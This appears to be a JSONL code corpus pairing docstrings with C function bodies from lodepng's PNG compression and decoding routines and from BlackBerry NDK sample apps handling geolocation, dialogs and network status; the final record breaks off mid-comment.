{"docstring": "/*write given buffer to the file, overwriting the file, it doesn't append to it.*/\n", "func_signal": "unsigned lodepng_save_file(const unsigned char* buffer, size_t buffersize, const char* filename)", "code": "{\n  FILE* file;\n  file = fopen(filename, \"wb\" );\n  if(!file) return 79;\n  fwrite((char*)buffer , 1 , buffersize, file);\n  fclose(file);\n  return 0;\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/*LODEPNG_COMPILE_DECODER*/\n", "func_signal": "static void setBitOfReversedStream(size_t* bitpointer, unsigned char* bitstream, unsigned char bit)", "code": "{\n  /*the current bit in bitstream may be 0 or 1 for this to work*/\n  if(bit == 0) bitstream[(*bitpointer) >> 3] &=  (unsigned char)(~(1 << (7 - ((*bitpointer) & 0x7))));\n  else         bitstream[(*bitpointer) >> 3] |=  (1 << (7 - ((*bitpointer) & 0x7)));\n  ++(*bitpointer);\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/*\nreturns the code, or (unsigned)(-1) if error happened\ninbitlength is the length of the complete buffer, in bits (so its byte length times 8)\n*/\n", "func_signal": "static unsigned huffmanDecodeSymbol(const unsigned char* in, size_t* bp,\n                                    const HuffmanTree* codetree, size_t inbitlength)", "code": "{\n  unsigned treepos = 0, ct;\n  for(;;)\n  {\n    if(*bp >= inbitlength) return (unsigned)(-1); /*error: end of input memory reached without endcode*/\n    /*\n    decode the symbol from the tree. The \"readBitFromStream\" code is inlined in\n    the expression below because this is the biggest bottleneck while decoding\n    */\n    ct = codetree->tree2d[(treepos << 1) + READBIT(*bp, in)];\n    ++(*bp);\n    if(ct < codetree->numcodes) return ct; /*the symbol is decoded, return it*/\n    else treepos = ct - codetree->numcodes; /*symbol not yet decoded, instead move tree position*/\n\n    if(treepos >= codetree->numcodes) return (unsigned)(-1); /*error: it appeared outside the codetree*/\n  }\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/* ////////////////////////////////////////////////////////////////////////// */\n/* / Adler32                                                                  */\n/* ////////////////////////////////////////////////////////////////////////// */\n", "func_signal": "static unsigned update_adler32(unsigned adler, const unsigned char* data, unsigned len)", "code": "{\n  unsigned s1 = adler & 0xffff;\n  unsigned s2 = (adler >> 16) & 0xffff;\n\n  while(len > 0)\n  {\n    /*at least 5552 sums can be done before the sums overflow, saving a lot of module divisions*/\n    unsigned amount = len > 5552 ? 5552 : len;\n    len -= amount;\n    while(amount > 0)\n    {\n      s1 += (*data++);\n      s2 += s1;\n      --amount;\n    }\n    s1 %= 65521;\n    s2 %= 65521;\n  }\n\n  return (s2 << 16) | s1;\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/* ////////////////////////////////////////////////////////////////////////// */\n/* / Reading and writing single bits and bytes from/to stream for LodePNG   / */\n/* ////////////////////////////////////////////////////////////////////////// */\n", "func_signal": "static unsigned char readBitFromReversedStream(size_t* bitpointer, const unsigned char* bitstream)", "code": "{\n  unsigned char result = (unsigned char)((bitstream[(*bitpointer) >> 3] >> (7 - ((*bitpointer) & 0x7))) & 1);\n  ++(*bitpointer);\n  return result;\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/*inflate a block with dynamic of fixed Huffman tree*/\n", "func_signal": "static unsigned inflateHuffmanBlock(ucvector* out, const unsigned char* in, size_t* bp,\n                                    size_t* pos, size_t inlength, unsigned btype)", "code": "{\n  unsigned error = 0;\n  HuffmanTree tree_ll; /*the huffman tree for literal and length codes*/\n  HuffmanTree tree_d; /*the huffman tree for distance codes*/\n  size_t inbitlength = inlength * 8;\n\n  HuffmanTree_init(&tree_ll);\n  HuffmanTree_init(&tree_d);\n\n  if(btype == 1) getTreeInflateFixed(&tree_ll, &tree_d);\n  else if(btype == 2) error = getTreeInflateDynamic(&tree_ll, &tree_d, in, bp, inlength);\n\n  while(!error) /*decode all symbols until end reached, breaks at end code*/\n  {\n    /*code_ll is literal, length or end code*/\n    unsigned code_ll = huffmanDecodeSymbol(in, bp, &tree_ll, inbitlength);\n    if(code_ll <= 255) /*literal symbol*/\n    {\n      /*ucvector_push_back would do the same, but for some reason the two lines below run 10% faster*/\n      if(!ucvector_resize(out, (*pos) + 1)) ERROR_BREAK(83 /*alloc fail*/);\n      out->data[*pos] = (unsigned char)code_ll;\n      ++(*pos);\n    }\n    else if(code_ll >= FIRST_LENGTH_CODE_INDEX && code_ll <= LAST_LENGTH_CODE_INDEX) /*length code*/\n    {\n      unsigned code_d, distance;\n      unsigned numextrabits_l, numextrabits_d; /*extra bits for length and distance*/\n      size_t start, forward, backward, length;\n\n      /*part 1: get length base*/\n      length = LENGTHBASE[code_ll - FIRST_LENGTH_CODE_INDEX];\n\n      /*part 2: get extra bits and add the value of that to length*/\n      numextrabits_l = LENGTHEXTRA[code_ll - FIRST_LENGTH_CODE_INDEX];\n      if((*bp + numextrabits_l) > inbitlength) ERROR_BREAK(51); /*error, bit pointer will jump past memory*/\n      length += readBitsFromStream(bp, in, numextrabits_l);\n\n      /*part 3: get distance code*/\n      code_d = huffmanDecodeSymbol(in, bp, &tree_d, inbitlength);\n      if(code_d > 29)\n      {\n        if(code_d == (unsigned)(-1)) /*huffmanDecodeSymbol returns (unsigned)(-1) in case of error*/\n        {\n          /*return error code 10 or 11 depending on the situation that happened in huffmanDecodeSymbol\n          (10=no endcode, 11=wrong jump outside of tree)*/\n          error = (*bp) > inlength * 8 ? 10 : 11;\n        }\n        else error = 18; /*error: invalid distance code (30-31 are never used)*/\n        break;\n      }\n      distance = DISTANCEBASE[code_d];\n\n      /*part 4: get extra bits from distance*/\n      numextrabits_d = DISTANCEEXTRA[code_d];\n      if((*bp + numextrabits_d) > inbitlength) ERROR_BREAK(51); /*error, bit pointer will jump past memory*/\n      distance += readBitsFromStream(bp, in, numextrabits_d);\n\n      /*part 5: fill in all the out[n] values based on the length and dist*/\n      start = (*pos);\n      if(distance > start) ERROR_BREAK(52); /*too long backward distance*/\n      backward = start - distance;\n\n      if(!ucvector_resize(out, (*pos) + length)) ERROR_BREAK(83 /*alloc fail*/);\n      if (distance < length) {\n        for(forward = 0; forward < length; ++forward)\n        {\n          out->data[(*pos)++] = out->data[backward++];\n        }\n      } else {\n        memcpy(out->data + *pos, out->data + backward, length);\n        *pos += length;\n      }\n    }\n    else if(code_ll == 256)\n    {\n      break; /*end code, break the loop*/\n    }\n    else /*if(code == (unsigned)(-1))*/ /*huffmanDecodeSymbol returns (unsigned)(-1) in case of error*/\n    {\n      /*return error code 10 or 11 depending on the situation that happened in huffmanDecodeSymbol\n      (10=no endcode, 11=wrong jump outside of tree)*/\n      error = ((*bp) > inlength * 8) ? 10 : 11;\n      break;\n    }\n  }\n\n  HuffmanTree_cleanup(&tree_ll);\n  HuffmanTree_cleanup(&tree_d);\n\n  return error;\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/******************************************************************************/\n", "func_signal": "static void LodePNGText_init(LodePNGInfo* info)", "code": "{\n  info->text_num = 0;\n  info->text_keys = NULL;\n  info->text_strings = NULL;\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/* returns negative value on error. This should be pure C compatible, so no fstat. */\n", "func_signal": "static long lodepng_filesize(const char* filename)", "code": "{\n  FILE* file;\n  long size;\n  file = fopen(filename, \"rb\");\n  if(!file) return -1;\n\n  if(fseek(file, 0, SEEK_END) != 0)\n  {\n    fclose(file);\n    return -1;\n  }\n\n  size = ftell(file);\n  /* It may give LONG_MAX as directory size, this is invalid for us. */\n  if(size == LONG_MAX) size = -1;\n\n  fclose(file);\n  return size;\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/*out must be buffer big enough to contain uncompressed IDAT chunk data, and in must contain the full image.\nreturn value is error**/\n", "func_signal": "static unsigned preProcessScanlines(unsigned char** out, size_t* outsize, const unsigned char* in,\n                                    unsigned w, unsigned h,\n                                    const LodePNGInfo* info_png, const LodePNGEncoderSettings* settings)", "code": "{\n  /*\n  This function converts the pure 2D image with the PNG's colortype, into filtered-padded-interlaced data. Steps:\n  *) if no Adam7: 1) add padding bits (= posible extra bits per scanline if bpp < 8) 2) filter\n  *) if adam7: 1) Adam7_interlace 2) 7x add padding bits 3) 7x filter\n  */\n  unsigned bpp = lodepng_get_bpp(&info_png->color);\n  unsigned error = 0;\n\n  if(info_png->interlace_method == 0)\n  {\n    *outsize = h + (h * ((w * bpp + 7) / 8)); /*image size plus an extra byte per scanline + possible padding bits*/\n    *out = (unsigned char*)lodepng_malloc(*outsize);\n    if(!(*out) && (*outsize)) error = 83; /*alloc fail*/\n\n    if(!error)\n    {\n      /*non multiple of 8 bits per scanline, padding bits needed per scanline*/\n      if(bpp < 8 && w * bpp != ((w * bpp + 7) / 8) * 8)\n      {\n        unsigned char* padded = (unsigned char*)lodepng_malloc(h * ((w * bpp + 7) / 8));\n        if(!padded) error = 83; /*alloc fail*/\n        if(!error)\n        {\n          addPaddingBits(padded, in, ((w * bpp + 7) / 8) * 8, w * bpp, h);\n          error = filter(*out, padded, w, h, &info_png->color, settings);\n        }\n        lodepng_free(padded);\n      }\n      else\n      {\n        /*we can immediately filter into the out buffer, no other steps needed*/\n        error = filter(*out, in, w, h, &info_png->color, settings);\n      }\n    }\n  }\n  else /*interlace_method is 1 (Adam7)*/\n  {\n    unsigned passw[7], passh[7];\n    size_t filter_passstart[8], padded_passstart[8], passstart[8];\n    unsigned char* adam7;\n\n    Adam7_getpassvalues(passw, passh, filter_passstart, padded_passstart, passstart, w, h, bpp);\n\n    *outsize = filter_passstart[7]; /*image size plus an extra byte per scanline + possible padding bits*/\n    *out = (unsigned char*)lodepng_malloc(*outsize);\n    if(!(*out)) error = 83; /*alloc fail*/\n\n    adam7 = (unsigned char*)lodepng_malloc(passstart[7]);\n    if(!adam7 && passstart[7]) error = 83; /*alloc fail*/\n\n    if(!error)\n    {\n      unsigned i;\n\n      Adam7_interlace(adam7, in, w, h, bpp);\n      for(i = 0; i != 7; ++i)\n      {\n        if(bpp < 8)\n        {\n          unsigned char* padded = (unsigned char*)lodepng_malloc(padded_passstart[i + 1] - padded_passstart[i]);\n          if(!padded) ERROR_BREAK(83); /*alloc fail*/\n          addPaddingBits(padded, &adam7[passstart[i]],\n                         ((passw[i] * bpp + 7) / 8) * 8, passw[i] * bpp, passh[i]);\n          error = filter(&(*out)[filter_passstart[i]], padded,\n                         passw[i], passh[i], &info_png->color, settings);\n          lodepng_free(padded);\n        }\n        else\n        {\n          error = filter(&(*out)[filter_passstart[i]], &adam7[padded_passstart[i]],\n                         passw[i], passh[i], &info_png->color, settings);\n        }\n\n        if(error) break;\n      }\n    }\n\n    lodepng_free(adam7);\n  }\n\n  return error;\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/*LODEPNG_COMPILE_ENCODER*/\n", "func_signal": "void lodepng_palette_clear(LodePNGColorMode* info)", "code": "{\n  if(info->palette) lodepng_free(info->palette);\n  info->palette = 0;\n  info->palettesize = 0;\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/*get the literal and length code tree of a deflated block with fixed tree, as per the deflate specification*/\n", "func_signal": "static unsigned generateFixedLitLenTree(HuffmanTree* tree)", "code": "{\n  unsigned i, error = 0;\n  unsigned* bitlen = (unsigned*)lodepng_malloc(NUM_DEFLATE_CODE_SYMBOLS * sizeof(unsigned));\n  if(!bitlen) return 83; /*alloc fail*/\n\n  /*288 possible codes: 0-255=literals, 256=endcode, 257-285=lengthcodes, 286-287=unused*/\n  for(i =   0; i <= 143; ++i) bitlen[i] = 8;\n  for(i = 144; i <= 255; ++i) bitlen[i] = 9;\n  for(i = 256; i <= 279; ++i) bitlen[i] = 7;\n  for(i = 280; i <= 287; ++i) bitlen[i] = 8;\n\n  error = HuffmanTree_makeFromLengths(tree, bitlen, NUM_DEFLATE_CODE_SYMBOLS, 15);\n\n  lodepng_free(bitlen);\n  return error;\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/*LODEPNG_COMPILE_DISK*/\n", "func_signal": "void lodepng_decoder_settings_init(LodePNGDecoderSettings* settings)", "code": "{\n  settings->color_convert = 1;\n#ifdef LODEPNG_COMPILE_ANCILLARY_CHUNKS\n  settings->read_text_chunks = 1;\n  settings->remember_unknown_chunks = 0;\n#endif /*LODEPNG_COMPILE_ANCILLARY_CHUNKS*/\n  settings->ignore_crc = 0;\n  settings->ignore_critical = 0;\n  settings->ignore_end = 0;\n  lodepng_decompress_settings_init(&settings->zlibsettings);\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/*index: bitgroup index, bits: bitgroup size(1, 2 or 4), in: bitgroup value, out: octet array to add bits to*/\n", "func_signal": "static void addColorBits(unsigned char* out, size_t index, unsigned bits, unsigned in)", "code": "{\n  unsigned m = bits == 1 ? 7 : bits == 2 ? 3 : 1; /*8 / bits - 1*/\n  /*p = the partial index in the byte, e.g. with 4 palettebits it is 0 for first half or 1 for second half*/\n  unsigned p = index & m;\n  in &= (1u << bits) - 1u; /*filter out any other bits of the input value*/\n  in = in << (bits * (m - p));\n  if(p == 0) out[index * bits / 8] = in;\n  else out[index * bits / 8] |= in;\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/* log2 approximation. A slight bit faster than std::log. */\n", "func_signal": "static float flog2(float f)", "code": "{\n  float result = 0;\n  while(f > 32) { result += 4; f /= 16; }\n  while(f > 2) { ++result; f /= 2; }\n  return result + 1.442695f * (f * f * f / 3 - 3 * f * f / 2 + 3 * f - 1.83333f);\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/* compress using the default or custom zlib function */\n", "func_signal": "static unsigned zlib_compress(unsigned char** out, size_t* outsize, const unsigned char* in,\n                              size_t insize, const LodePNGCompressSettings* settings)", "code": "{\n  if(settings->custom_zlib)\n  {\n    return settings->custom_zlib(out, outsize, in, insize, settings);\n  }\n  else\n  {\n    return lodepng_zlib_compress(out, outsize, in, insize, settings);\n  }\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/**\n * Use the PID to set the window group id.\n */\n", "func_signal": "static const char *\nget_window_group_id()", "code": "{\n    static char s_window_group_id[16] = \"\";\n\n    if (s_window_group_id[0] == '\\0') {\n        snprintf(s_window_group_id, sizeof(s_window_group_id), \"%d\", getpid());\n    }\n\n    return s_window_group_id;\n}", "path": "IDS_C_Sample\\bbutil.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * Handle a geolocation response.\n */\n", "func_signal": "static void\nhandle_geolocation_response(bps_event_t *event)", "code": "{\n    static int count = 0;\n\n    /* Double check that the event is valid */\n    if (event == NULL || bps_event_get_code(event) != GEOLOCATION_INFO) {\n        return;\n    }\n\n    double latitude = geolocation_event_get_latitude(event);\n    double longitude = geolocation_event_get_longitude(event);\n    double accuracy = geolocation_event_get_accuracy(event);\n    double altitude = geolocation_event_get_altitude(event);\n    bool altitude_valid = geolocation_event_is_altitude_valid(event);\n    double altitude_accuracy = geolocation_event_get_altitude_accuracy(event);\n    bool altitude_accuracy_valid = geolocation_event_is_altitude_accuracy_valid(event);\n    double heading = geolocation_event_get_heading(event);\n    bool heading_valid = geolocation_event_is_heading_valid(event);\n    double speed = geolocation_event_get_speed(event);\n    bool speed_valid = geolocation_event_is_speed_valid(event);\n    double num_satellites_used = geolocation_event_get_num_satellites_used(event);\n    bool num_satellites_valid = geolocation_event_is_num_satellites_valid(event);\n\n    display_geolocation_data(count++,\n                             latitude, longitude, accuracy,\n                             altitude, altitude_valid, altitude_accuracy, altitude_accuracy_valid,\n                             heading, heading_valid,\n                             speed, speed_valid,\n                             num_satellites_used, num_satellites_valid);\n}", "path": "Geolocation\\main.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * Formats int data into a buffer.\n */\n", "func_signal": "static char *\nformat_int_data(char * buf, size_t buf_size, const char * desc, const char * units, int data, bool valid)", "code": "{\n    if (valid) {\n        snprintf(buf, buf_size, \"%s: % d %s\", desc, data, units);\n    } else {\n        snprintf(buf, buf_size, \"%s: N/A\", desc);\n    }\n\n    return buf;\n}", "path": "Geolocation\\main.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/* Finds the next power of 2 */\n", "func_signal": "static inline int\nnextp2(int x)", "code": "{\n    int val = 1;\n    while(val < x) val <<= 1;\n    return val;\n}", "path": "IDS_C_Sample\\bbutil.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * Formats double data into a buffer.\n */\n", "func_signal": "static char *\nformat_double_data(char * buf, size_t buf_size, const char * desc, const char * units, double data, bool valid)", "code": "{\n    if (valid) {\n        snprintf(buf, buf_size, \"%s: % 7.3f %s\", desc, data, units);\n    } else {\n        snprintf(buf, buf_size, \"%s: N/A\", desc);\n    }\n\n    return buf;\n}", "path": "Geolocation\\main.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * A sample application that demonstrates the BlackBerry(R) 10 Native SDK APIs\n * for displaying dialog windows.\n */\n", "func_signal": "int\nmain(int argc, char *argv[])", "code": "{\n    int exit_application = 0;\n\n    /*\n     * Before we can listen for events from the BlackBerry(R) 10 OS platform\n     * services, we need to initialize the BPS infrastructure\n     */\n    bps_initialize();\n\n    /*\n     * Initialize the screen so that the window group Id is properly set, to allow\n     * the dialogs to be displayed.\n     */\n    if (setup_screen() != EXIT_SUCCESS) {\n        fprintf(stderr, \"Unable to initialize screen.\");\n        exit(0);\n    }\n\n    /*\n     * Once the BPS infrastructure has been initialized we can register for\n     * events from the various BlackBerry(R) 10 OS platform services. The\n     * Navigator service manages and delivers application life cycle and\n     * visibility events.\n     * For this sample, we request Navigator events so that we can track when\n     * the system is terminating the application (NAVIGATOR_EXIT event), and as a\n     * convenient way to trigger the display of a dialog (NAVIGATOR_SWIPE_DOWN).\n     * We request dialog events so we can be notified when the dialog service\n     * responds to our requests/queries.\n     */\n    navigator_request_events(0);\n    dialog_request_events(0);\n\n    /*\n     * start the application with a dialog.\n     */\n    show_alert();\n\n    /*\n     * Process Dialog and Navigator events until we receive a NAVIGATOR_EXIT event.\n     */\n    while (!exit_application) {\n        /*\n         * Using a negative timeout (-1) in the call to bps_get_event(...)\n         * ensures that we don't busy wait by blocking until an event is\n         * available.\n         */\n        bps_event_t *event = NULL;\n        bps_get_event(&event, -1);\n\n        if (event) {\n            /*\n             * If it is a dialog event, determine the response code\n             * and handle the event accordingly.\n             */\n            if (bps_event_get_domain(event) == dialog_get_domain()) {\n                handle_dialog_response(event);\n            }\n\n            /*\n             * If it is a NAVIGATOR_EXIT event then set the exit_application\n             * flag so the application will stop processing events, clean up\n             * and exit.\n             *\n             * If it is a NAVIGATOR_SWIPE_DOWN event, display an alert dialog.\n             */\n            if (bps_event_get_domain(event) == navigator_get_domain()) {\n                if (NAVIGATOR_EXIT == bps_event_get_code(event)) {\n                    exit_application = 1;\n                } else if (NAVIGATOR_SWIPE_DOWN == bps_event_get_code(event)) {\n                    show_alert();\n                }\n            }\n        }\n    }\n\n    /*\n     * Destroy the dialog, if it still exists.\n     */\n    if (alert_dialog) {\n        dialog_destroy(alert_dialog);\n    }\n\n    /*\n     * Clean up the BPS infrastructure and exit\n     */\n    bps_shutdown();\n    screen_destroy_window(screen_win);\n    screen_destroy_context(screen_ctx);\n    return 0;\n}", "path": "Dialog\\main.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * Displays geolocation data in the main dialog.\n */\n", "func_signal": "static void\ndisplay_geolocation_data(int count,\n                         double latitude, double longitude, double accuracy,\n                         double altitude, bool altitude_valid,\n                         double altitude_accuracy, bool altitude_accuracy_valid,\n                         double heading, bool heading_valid,\n                         double speed, bool speed_valid,\n                         int num_satellites_used, bool num_satellites_valid)", "code": "{\n\n    char altitude_buf[128];\n    char altitude_accuracy_buf[128];\n    char heading_buf[128];\n    char speed_buf[128];\n    char num_satellites_used_buf[128];\n\n    snprintf(msg, MSG_SIZE,\n             \"Geolocation report #%d\\n\"\n             \"\\tlatitude: % 13.8f degrees\\n\"\n             \"\\tlongitude: % 13.8f degrees\\n\"\n             \"\\taccuracy: % 7.3f m\\n\"\n             \"\\t%s\\n\"\n             \"\\t%s\\n\"\n             \"\\t%s\\n\"\n             \"\\t%s\\n\"\n             \"\\t%s\\n\",\n             count,\n             latitude, longitude, accuracy,\n             format_double_data(altitude_buf, sizeof altitude_buf, \"altitude\", \"m\",\n                                altitude, altitude_valid),\n             format_double_data(altitude_accuracy_buf, sizeof altitude_accuracy_buf, \"altitude accuracy\", \"m\",\n                                altitude_accuracy, altitude_accuracy_valid),\n             format_double_data(heading_buf, sizeof heading_buf, \"heading\", get_bearing(heading),\n                                heading, heading_valid),\n             /* Speed is reported in m/s.  To convert to km/h, use the formula:\n              *   1 m/s = 60*60/1000 km/h = 3.6 km/h\n              */\n             format_double_data(speed_buf, sizeof speed_buf, \"speed\", \"km/h\",\n                                speed*3.6, speed_valid),\n             format_int_data(num_satellites_used_buf, sizeof num_satellites_used_buf, \"number of satellites used\", \"\",\n                             num_satellites_used, num_satellites_valid)\n        );\n\n    show_dialog_message(msg);\n}", "path": "Geolocation\\main.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * Handle a navigator event.\n *\n * @return @c true if application should exit, else false.\n */\n", "func_signal": "static bool\nhandle_navigator_event(bps_event_t *event)", "code": "{\n    bool should_exit = false;\n\n    switch (bps_event_get_code(event)) {\n    case NAVIGATOR_EXIT:\n        should_exit = true;\n        break;\n    }\n\n    return should_exit;\n}", "path": "Geolocation\\main.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * Use the PID to set the window group id.\n */\n", "func_signal": "static const char *\nget_window_group_id()", "code": "{\n    static char s_window_group_id[16] = \"\";\n\n    if (s_window_group_id[0] == '\\0') {\n        snprintf(s_window_group_id, sizeof(s_window_group_id), \"%d\", getpid());\n    }\n\n    return s_window_group_id;\n}", "path": "Gamepad\\bbutil.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * Use the PID to set the window group id.\n */\n", "func_signal": "static const char *\nget_window_group_id()", "code": "{\n    static char s_window_group_id[16] = \"\";\n\n    if (s_window_group_id[0] == '\\0') {\n        snprintf(s_window_group_id, sizeof(s_window_group_id), \"%d\", getpid());\n    }\n\n    return s_window_group_id;\n}", "path": "Geolocation\\dialogutil.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * A sample application that demonstrates the BlackBerry(R) 10 Native SDK APIs\n * for geolocation.\n */\n", "func_signal": "int\nmain(int argc, char *argv[])", "code": "{\n    bool exit_application = false;\n\n    /*\n     * Before we can listen for events from the BlackBerry(R) 10 OS platform\n     * services, we need to initialize the BPS infrastructure\n     */\n    bps_initialize();\n\n    /*\n     * Initialize the screen so that the window group Id is properly set, to allow\n     * the dialogs to be displayed.\n     */\n    if (setup_screen() != EXIT_SUCCESS) {\n        fprintf(stderr, \"Unable to initialize screen.\");\n        exit(-1);\n    }\n\n    /*\n     * Once the BPS infrastructure has been initialized we can register for\n     * events from the various BlackBerry(R) 10 OS platform services. The\n     * Navigator service manages and delivers application life cycle and\n     * visibility events.\n     *\n     * For this sample, we request Navigator events so that we can track when\n     * the system is terminating the application (NAVIGATOR_EXIT event).\n     *\n     * We request dialog events so we can be notified when the dialog service\n     * responds to our requests/queries.\n     *\n     * We request geolocation events so that we can be notified of our current\n     * geolocation.\n     */\n    if (BPS_SUCCESS != navigator_request_events(0)) {\n        fprintf(stderr, \"Error requesting navigator events: %s\", strerror(errno));\n        exit(-1);\n    }\n    if (BPS_SUCCESS != dialog_request_events(0)) {\n        fprintf(stderr, \"Error requesting dialog events: %s\", strerror(errno));\n        exit(-1);\n    }\n    if (BPS_SUCCESS != geolocation_request_events(0)) {\n        fprintf(stderr, \"Error requesting geolocation events: %s\", strerror(errno));\n        exit(-1);\n    }\n\n    /*\n     * Get geolocation events once a second, which is the most often that they\n     * are capable of being reported.\n     */\n    geolocation_set_period(1);\n\n    /*\n     * Create and display the dialog that will show the geolocation data.\n     */\n    create_dialog();\n    show_dialog_message(\"Geolocation getting first fix\");\n\n    /*\n     * Process Geolocation, Dialog and Navigator events until we receive a\n     * NAVIGATOR_EXIT event.\n     */\n    while (!exit_application) {\n        /*\n         * Using a negative timeout (-1) in the call to bps_get_event(...)\n         * ensures that we don't busy wait by blocking until an event is\n         * available.\n         */\n        bps_event_t *event = NULL;\n        bps_get_event(&event, -1);\n\n        if (event) {\n            /*\n             * If it is a geolocation event, determine the response code and\n             * handle the event accordingly.\n             */\n            if (bps_event_get_domain(event) == geolocation_get_domain()) {\n                handle_geolocation_response(event);\n            }\n\n            /*\n             * If it is a dialog event, determine the response code and handle\n             * the event accordingly.\n             */\n            else if (bps_event_get_domain(event) == dialog_get_domain()) {\n                /* We have no buttons so we don't need to do anything. */\n                ;\n            }\n\n            /*\n             * If it is a NAVIGATOR_EXIT event then set the exit_application\n             * flag so the application will stop processing events, clean up and\n             * exit.\n             */\n            else if (bps_event_get_domain(event) == navigator_get_domain()) {\n                exit_application = handle_navigator_event(event);\n            }\n        }\n    }\n\n    /*\n     * Stop geolocation events.\n     */\n    geolocation_stop_events(0);\n\n    /*\n     * Destroy the dialog, if it exists.\n     */\n    destroy_dialog();\n\n    /*\n     * Clean up the bps infrastructure and exit\n     */\n    bps_shutdown();\n    cleanup_screen();\n    return 0;\n}", "path": "Geolocation\\main.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * Use the PID to set the window group id.\n */\n", "func_signal": "static const char *\nget_window_group_id()", "code": "{\n    static char s_window_group_id[16] = \"\";\n\n    if (s_window_group_id[0] == '\\0') {\n        snprintf(s_window_group_id, sizeof(s_window_group_id), \"%d\", getpid());\n    }\n\n    return s_window_group_id;\n}", "path": "Channels\\dialogchannel.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * A sample application demonstrates the BlackBerry(R) 10 Native SDK APIs for\n * network status.  The sample queries for the current network status and then\n * listens for status update events.\n */\n", "func_signal": "int\nmain(int argc, char *argv[])", "code": "{\n    /*\n     * Before we can listen for events from the BlackBerry(R) 10 OS platform\n     * services, we need to initialize the BPS infrastructure\n     */\n    bps_initialize();\n\n    if (setup_screen() != EXIT_SUCCESS) {\n        printf(\"Unable to set up the screen. Exiting.\");\n        return 0;\n    }\n\n    /*\n     * once the BPS infrastructure has been initialized we can register for\n     * events from the various BlackBerry(R) 10 OS platform services. The\n     * Navigator service manages and delivers application life cycle and\n     * visibility events.\n     * For this sample, we request Navigator events so that we can track when\n     * the system is terminating the application (NAV_EXIT event) as well as\n     * Network Status service events so we can be notified when the network\n     * status is updated\n     */\n    navigator_request_events(0);\n    netstatus_request_events(0);\n    dialog_request_events(0);\n\n    /*\n     * Create and display the dialog.\n     */\n    create_dialog();\n\n    /*\n     * Retrieve and display the current network status using the\n     * netstatus_get_availability(...) call\n     */\n    netstatus_info_t *netstatus_info = NULL;\n    bool is_available = false;\n    if (BPS_SUCCESS == netstatus_get_info(&netstatus_info)) {\n        is_available = netstatus_info_get_availability(netstatus_info);\n        netstatus_free_info(&netstatus_info);\n    }\n    display_net_status(is_available);\n\n   /*\n    * Process Network Status and Navigator events until we receive a NAVIGATOR_EXIT\n    * event.\n    */\n    int exit_application = 0;\n    while (!exit_application) {\n        /*\n         * Using a negative timeout (-1) in the call to bps_get_event(...)\n         * ensures that we don't busy wait by blocking until an event is\n         * available.\n         */\n        bps_event_t *event = NULL;\n        bps_get_event(&event, -1);\n\n        if (event) {\n            /*\n             * If it is a NETSTATUS_INFO event then display the updated status\n             */\n            if (bps_event_get_domain(event) == netstatus_get_domain()) {\n                if (NETSTATUS_INFO == bps_event_get_code(event)) {\n                    netstatus_info = netstatus_event_get_info(event);\n                    is_available = netstatus_info_get_availability(netstatus_info);\n                    display_net_status(is_available);\n                }\n            }\n            /*\n             * If it is a 